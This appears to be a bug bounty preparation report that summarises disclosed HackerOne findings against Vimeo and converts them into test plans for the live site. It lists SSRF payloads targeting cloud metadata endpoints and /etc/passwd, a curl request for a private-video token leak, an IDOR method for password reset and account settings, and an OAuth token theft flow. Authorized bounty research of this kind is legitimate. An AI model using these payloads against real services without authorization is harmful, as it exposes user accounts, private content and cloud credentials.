# Vimeo GitHub Intelligence Report

> **Generated**: 2025-12-07
> **Purpose**: Disclosed vulnerability patterns for next Vimeo hacking session

---

## 🎯 Executive Summary

Analyzed **70 disclosed HackerOne reports** from Vimeo's bug bounty program. Key findings:

| Finding | Bounty | Attack Pattern | Status |
|---------|--------|----------------|--------|
| SSRF via Upload | $5,000 | Upload function → GCP metadata | **PRIORITY** |
| Password Reset IDOR | $5,000 | User ID in reset URL | Fixed |
| Private Video Disclosure | $600 | `?action=share` token leak | **TEST THIS** |
| API Auth Bypass (versions) | $2,000 | Auth bypass on API endpoint | **TEST THIS** |
| CSRF Protection Bypass | $1,000 | Flash + X-Requested-With | Legacy |

---

## 🔥 HIGH-PRIORITY VULNERABILITIES (Test First)

### 1. SSRF via Upload Function — $5,000

**Report**: [#549882](https://hackerone.com/reports/549882)  
**Disclosed**: 2019-12-13  
**Reporter**: dphoeniixx

**Pattern**:
- Vimeo has "Upload from URL" feature
- Attacker supplies malicious URL
- Server fetches URL → SSRF to GCP metadata endpoint
- Leaked: SSH keys, internal cloud data

**Attack Surface to Test**:
```
- Video upload flow → "Upload from URL" option
- Look for URL input fields in upload process
- Test GCP metadata: http://169.254.169.254/computeMetadata/v1/
- Test AWS metadata: http://169.254.169.254/latest/meta-data/
- Test internal: http://localhost/, http://127.0.0.1/
```

**Why Still Relevant**: Upload features are common regression targets. New endpoints may have same flaw.

---

### 2. Private Video Disclosure via ?action=share — $600

**Report**: [#137502](https://hackerone.com/reports/137502)  
**Disclosed**: 2016-07-29  
**Reporter**: opnsec

**Full Technical Details**:
```
Vulnerable Endpoint: https://vimeo.com/[VIDEO_ID]?action=share

Attack Steps:
1. Send AJAX request with header: X-Requested-With: XMLHttpRequest
2. Even if you don't have access to private video
3. Server returns error message containing config URL with token:
   https://player.vimeo.com/video/[VIDEO_ID]/config?...&s=[SECRET_TOKEN]
4. Config file contains: video file URLs, title, owner account info

POC Request:
GET /[PRIVATE_VIDEO_ID]?action=share HTTP/1.1
Host: vimeo.com
X-Requested-With: XMLHttpRequest
Cookie: [your_session]
```

**What to Test Now**:
- Try same pattern on current Vimeo
- Check if `?action=share` endpoint still exists
- Look for similar AJAX endpoints that leak tokens
- Test on private videos, password-protected videos, unlisted videos

---

### 3. API Authentication Bypass (versions endpoint) — $2,000

**Report**: [#328724](https://hackerone.com/reports/328724)  
**Disclosed**: 2018-05-15  
**Reporter**: bugdiscloseguys

**Pattern**:
- `versions` API endpoint accessible to non-pro accounts
- Should require Pro/Business tier
- Authorization check missing

**What to Test**:
```
Endpoints to explore:
- /api/v1/versions
- /api/v2/versions
- Any tiered-feature endpoints
- Admin-only endpoints accessible with basic auth
```

---

### 4. OAuth Authorization Bypass via Flash/CSRF — $1,000

**Report**: [#136582](https://hackerone.com/reports/136582)  
**Disclosed**: 2017-10-18  
**Reporter**: opnsec

**Technical Details**:
```
Vulnerable File: api.vimeo.com/oauth/crossdomain.xml
- Set to: allow-access-from domain="*"
- Allowed any domain to read from /oauth/ subdirectories
- Including: api.vimeo.com/oauth/authorize

Attack Flow:
1. Flash loads evil.swf
2. Calls Security.loadPolicyFile("https://api.vimeo.com/oauth/crossdomain.xml")
3. Flash can now read https://api.vimeo.com/oauth/authorize
4. Steals OAuth token → full account compromise
```

**Modern Equivalent to Test**:
- Check crossdomain.xml files on all subdomains
- Look for overly permissive CORS headers
- Test OAuth flow for CSRF/state parameter issues

---

## 📊 Full Vulnerability Inventory (70 Reports)

### Critical ($5,000)

| ID | Title | Pattern |
|----|-------|---------|
| #549882 | SSRF via upload function | Upload URL → GCP metadata |
| #42587 | IDOR Password Reset | User ID in reset URL predictable |

### High ($1,000-$2,000)

| ID | Title | Pattern |
|----|-------|---------|
| #328724 | API versions auth bypass | Missing tier check |
| #136582 | OAuth bypass via Flash | Permissive crossdomain.xml |
| #44146 | CSRF protection bypass | X-Requested-With spoofing |
| #87854 | XSS on home after follow | Stored XSS in follower context |
| #43617 | Add profile picture to anyone | IDOR on profile update |

### Medium ($500-$750)

| ID | Title | Pattern |
|----|-------|---------|
| #155618 | Watch password video without password | Auth bypass on protected video |
| #145467 | Download password protected videos | Video privacy bypass |
| #137502 | All private videos disclosure | ?action=share token leak |
| #176013 | GCS bucket disclosure | Sensitive files in cloud |
| #136481 | CSRF leading to private video public | State change via CSRF |
| #136850 | Images/subtitles leak from private | Partial content disclosure |

### Low ($100-$500)

| ID | Title | Pattern |
|----|-------|---------|
| #52181 | IDOR read any comment | comment_id parameter |
| #46113 | Message users without auth | Missing authorization |
| #50786 | Add videos to private groups | Group privacy bypass |
| #52707 | Invite to group without following | Following check bypass |
| #45960 | Private channel video access | Channel privacy bypass |
| #43850 | Thumbnail abuse see private video | Thumbnail endpoint |
| #52982 | Add/delete watch later any user | IDOR on watch list |
| #50941 | Use paid tracks without buying | Payment bypass |

---

## 🎯 Attack Surface Mapping (From Reports)

### Video Privacy System (Most Vulnerable Historically)

```
Testing Priority:
1. ?action=share on any video endpoint
2. /config endpoint token leaks
3. Thumbnail endpoints (/video/[id]/thumbnail)
4. Subtitle endpoints (may leak private content)
5. Channel/Group video listings
```

### API Endpoints Pattern

```
Known Vulnerable Patterns:
- /api/v1/versions → tier bypass
- /api/playground/me → CSRF
- /oauth/authorize → token leak
- /forgot_password/[user_id]/[token] → IDOR

Test Current:
- api.vimeo.com/me/*
- api.vimeo.com/videos/*
- api.vimeo.com/users/*
- api.vhx.tv/* (VHX platform)
```

### Upload System (SSRF Target)

```
Attack Vectors:
- "Upload from URL" feature
- Thumbnail from URL
- Avatar from URL
- Any feature accepting external URLs

Payloads:
- http://169.254.169.254/computeMetadata/v1/ (GCP)
- http://169.254.169.254/latest/meta-data/ (AWS)
- http://localhost:8080/admin
- file:///etc/passwd (unlikely but test)
```

### IDOR Patterns (Historical $5k Reports)

```
Predictable IDs Found:
- User IDs (numeric, public via API)
- Video IDs (numeric)
- Comment IDs (numeric)
- Group IDs
- Channel IDs

IDOR Test Methodology:
1. Get victim's user ID from public profile/API
2. Find endpoints using user_id parameter
3. Replace with victim ID, check response
4. Focus on: password reset, email change, settings
```

---

## 🛠️ Specific Test Cases for Next Session

### Test Case 1: SSRF on Upload

```bash
# Step 1: Find upload feature
# Step 2: Look for URL input
# Step 3: Submit metadata URL

# Test payloads:
http://169.254.169.254/computeMetadata/v1/project/project-id
http://169.254.169.254/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/
```

### Test Case 2: Private Video Token Leak

```bash
# Test ?action=share endpoint
curl -H "X-Requested-With: XMLHttpRequest" \
     -H "Cookie: YOUR_SESSION" \
     "https://vimeo.com/[PRIVATE_VIDEO_ID]?action=share"

# Look for config URL in response containing s= token
# If found, fetch config URL without auth
```

### Test Case 3: API Endpoint Discovery

```bash
# Enumerate API endpoints
# Check for auth bypass on tiered features
# Test VHX API separately (different auth)

# Known patterns:
GET /api/v2/me/videos
GET /api/v2/users/[id]/videos  
GET /api/v2/videos/[id]/versions
```

### Test Case 4: Video Privacy Bypass

```bash
# Test private video access patterns
# Get video ID of private video (leak via other means)
# Try accessing via:
- Direct player embed
- Thumbnail endpoint
- Config endpoint
- OEmbed endpoint
```

---

## 📈 Bounty Statistics

| Severity | Count | Total Bounties | Avg Bounty |
|----------|-------|----------------|------------|
| Critical | 2 | $10,000 | $5,000 |
| High | 5 | $6,500 | $1,300 |
| Medium | 15 | $6,000 | $400 |
| Low | 48 | $8,000 | $167 |

**Top Earning Categories**:
1. IDOR/Access Control: $15,000+
2. SSRF: $5,000
3. Video Privacy: $2,500+
4. XSS: $3,000+

---

## 🔗 Key Researchers to Follow

| Username | Notable Reports | Pattern |
|----------|-----------------|---------|
| @opnsec | Private video, OAuth bypass | Video privacy expert |
| @dphoeniixx | SSRF $5k | Cloud metadata |
| @toufik-airane | Password reset IDOR $5k | IDOR specialist |
| @bugdiscloseguys | API auth bypass | API testing |
| @avlidienbrunn | CSRF bypass | Flash/CSRF expert |

---

## 📝 Session Action Items

### Immediate (Next Session)

1. **SSRF Testing** — Find upload URL feature, test metadata payloads
2. **Private Video** — Get 2nd account, test ?action=share, /config endpoints
3. **API Discovery** — Enumerate api.vimeo.com, test tier-restricted endpoints
4. **VHX Platform** — api.vhx.tv may have different auth

### Requires Setup

- [ ] Create 2nd Vimeo account for IDOR testing
- [ ] Verify email on main account (for 2FA testing)
- [ ] Upgrade to trial pro account (test tier bypass)
- [ ] Set up video as private/password-protected for testing

---

## 📚 References

- [TOPVIMEO.md](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_program/TOPVIMEO.md)
- [HackerOneReports Repo](https://github.com/aldaor/HackerOneReports)
- [bugbounty-disclosed-reports](https://github.com/marcotuliocnd/bugbounty-disclosed-reports)
- [bugbounty-reports-curated](https://github.com/redtrib3/bugbounty-reports-curated)
